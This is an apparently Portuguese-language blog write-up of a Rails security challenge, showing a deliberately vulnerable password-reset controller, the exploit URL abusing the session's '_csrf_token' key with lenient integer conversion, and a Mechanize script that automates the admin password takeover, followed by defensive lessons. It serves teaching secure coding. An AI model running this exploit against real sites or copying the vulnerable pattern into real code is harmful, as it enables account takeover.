---
title: "[Small Bite] Session Injection Challenge"
date: '2014-08-28T12:00:00-03:00'
slug: small-bite-session-injection-challenge
tags:
- metasploit
- security
draft: false
---

Eu expliquei rapidamente sobre Metasploit no [artigo anterior](http://www.akitaonrails.com/2014/08/27/small-bite-brincando-com-metasploit), e sobre o desafio do [@joernchen](https://gist.github.com/joernchen). Se você ainda não resolveu o desafio, talvez queira deixar pra ler este artigo depois!

**SPOILER ALERT**

Mas se abriu até aqui no artigo é porque quer saber o que é o problema. O @joernchen [publicou exatamente o seguinte código](https://gist.github.com/joernchen/9dfa57017b4732c04bcc):

--- ruby
# Try to become "admin" on http://gettheadmin.herokuapp.com/ 
# Vector borrowed from real-world code ;)
 
 
# config/routes.rb:
 
  root 'login#login'
  post 'login' => 'login#login'
  get 'reset/:token' => 'login#password_reset'
 
# app/controllers/login_controller.rb
 
class LoginController < ApplicationController
  def login
    if request.post?
      user = User.where(login: params[:login]).first
      if !user.nil?
        if params[:password] == user.password
           render :text => "censored"
        end
        render :text => "Wrong Password"
        return
      end
    else
      render :template => "login/form"
    end
  end
  def password_reset
    @user = User.where(token: params[:token]).first
    if @user
      session[params[:token]] = @user.id
    else
      user_id = session[params[:token]]
      @user = User.find(user_id) if user_id
    end
    if !@user
      render :text => "no way!"
      return
    elsif params[:password] && @user && params[:password].length > 6
      @user.password = params[:password]
        if @user.save
          render :text => "password changed ;)"
          return
        end
    end
    render :text => "error saving password!"
  end
 
end
```

Basicamente um trecho do arquivo de <tt>routes.rb</tt> e o <tt>login_controller.rb</tt>. Assuma que também tem um form que poderia ser algo assim:

--- html
<%= form_tag '/login', method: :post do %>
  <%= text_field_tag 'login' %>
  <%= password_field_tag 'password' %>
  <%= submit_tag 'login' %>
<% end %>
```

E um model chamado <tt>User</tt> que poderia ter a seguinte migration:

--- ruby
class CreateUsers < ActiveRecord::Migration
  def change
    create_table :users do |t|
      t.string :token
      t.string :login
      t.string :password

      t.timestamps
    end
  end
end
```

E, finalmente, um seed que poderia ter o seguinte:

```
User.create token: 'qualquercoisa', login: 'admin', password: 'qualquercoisa'
```

Primeiro entenda o que o controller faz:

* tem uma action simples de <tt>login</tt> que valida o POST de usuário e senha e renderiza o form de login.
* tem uma action de <tt>reset_password</tt> que atende a rota <tt>reset/:token</tt>.

Quando o form é renderizado, ele gera um HTML assim:

--- html
<!DOCTYPE html>
<html>
<head>
  <title>Gettheadmin</title>
  <link data-turbolinks-track="true" href="/assets/application-9cc0575249625b8d8648563841072913.css" media="all" rel="stylesheet" />
  <script data-turbolinks-track="true" src="/assets/application-baf6c4c3436bbd5accc1b87ff9b9eabe.js"></script>
  <meta content="authenticity_token" name="csrf-param" />
<meta content="857GlwfWLYjv66EGyXa4d7PNUkPZleMgWcL+biMpDzE=" name="csrf-token" />
</head>
<body>

<form accept-charset="UTF-8" action="/login" method="post"><div style="display:none"><input name="utf8" type="hidden" value="&#x2713;" /><input name="authenticity_token" type="hidden" value="857GlwfWLYjv66EGyXa4d7PNUkPZleMgWcL+biMpDzE=" /></div>
  <input id="login" name="login" type="text" />
  <input id="password" name="password" type="password" />
  <input name="commit" type="submit" value="login" />
</form>

</body>
</html>
```

O importante: o token CSRF na tag de meta. Ele é diferente toda vez que você puxa o formulário e serve para evitar [Cross Site Request Forgery](http://guides.rubyonrails.org/security.html#cross-site-request-forgery-csrf). Mas tem um detalhe importante: quando a session é inicializada ele sempre vai ter pelo menos duas chave-valor: uma que é a "session_id" e outra com a chave "_csrf_token" com o valor que aparece no HTML justamente para fazer a checagem.

E a parte que é o buraco no controller é este:

--- ruby
user_id = session[params[:token]]
@user = User.find(user_id) if user_id
```

Se o <tt>params[:token]</tt> for "_csrf_token", o equivalente ficaria assim:

--- ruby
@user = User.find(session['_csrf_token'])
```

Agora, sabemos que o <tt>User.create</tt> inicial vai criar um admin com o ID que será o inteiro "1". O método <tt>#find</tt> aceita não só números como strings (para o caso, por exemplo, onde você cria uma renderização alternativa de ID para fazer URLs bonitas como no Wordpress onde ficaria "/1-admin" em vez de "/1"). 

Quando você faz:

--- ruby
"1abcd".to_i # => 1
```

Note que ele ignora o que não é string e devolve o inteiro 1.

Portanto, basta dar reload no site até o "_csrf_token" começar com "1" seguindo de letras. Aí ele vai fazer <tt>User.find("1abcd")</tt> que é o mesmo que <tt>User.find(1)</tt> e pronto! Conseguimos o usuário. E para piorar, o código do controller ainda faz isso em seguinte:

--- ruby
if params[:password] && @user && params[:password].length > 6
  @user.password = params[:password]
    if @user.save
      render :text => "password changed ;)"
      return
    end
end
```

Ou seja, ele grava a nova senha que você passar como parâmetro. Portanto a URL para exploit é:

```
http://gettheadmin.herokuapp.com/reset/_csrf_token?password=1234567
```

E para automatizar o exploit, fiz este pequeno script:

--- ruby
require 'rubygems'
require 'mechanize'

100.times do
  agent = Mechanize.new { |agent|
    agent.user_agent_alias = 'Mac Safari'
  }
  page = agent.get("http://gettheadmin.herokuapp.com/")
  token = page.at('meta[@name="csrf-token"]')[:content]
  puts token
  if token =~ /^1\w+/
    puts "TRYING EXPLOIT!!"
    doc = agent.get('http://gettheadmin.herokuapp.com/reset/_csrf_token?password=1234567')
    break if doc.content =~ /password changed/
  end
end
```

Quando o script parar, a senha mudou pra "1234567", agora basta fazer login com o usuário "admin" e senha "1234567" e pronto, você está dentro!

E eu coloquei 100 vezes, mas muito antes disso já vai parar porque não demora muito pra um "_csrf_token" que começa com "1".

![Exploit funciona](https://akitaonrails.s3.amazonaws.com/assets/image_asset/image/469/pasted_image_at_2014_08_27_11_38_am.png)

Lições aprendidas:

* A session tem valores por padrão! Nunca busque chaves na session baseado diretamente num parâmetro de URL. Aliás, **nunca** confie em parâmetros de URL

* Cuidado com o método <tt>#find</tt> do ActiveRecord por causa da conversão implícita de string para integer.

* Use uma biblioteca que já cuida desses detalhes como o [Devise](https://github.com/plataformatec/devise)

Assista aos screencasts do RubyTapas que falam justamente sobre conversões de strings:

* [206. Coersion](http://www.rubytapas.com/episodes/206-Coercion)
* [207. Conversion Function](http://www.rubytapas.com/episodes/207-Conversion-Function)
* [208. Lenient Conversions](http://www.rubytapas.com/episodes/208-Lenient-Conversions)
* [209. Explicit Conversion](http://www.rubytapas.com/episodes/209-Explicit-Conversion)
* [210. Implicit Conversion](http://www.rubytapas.com/episodes/210-Implicit-Conversion)

Alguém conseguiu explorar e mudar a senha de admin de outra forma diferente desta? Não deixe de comentar abaixo.
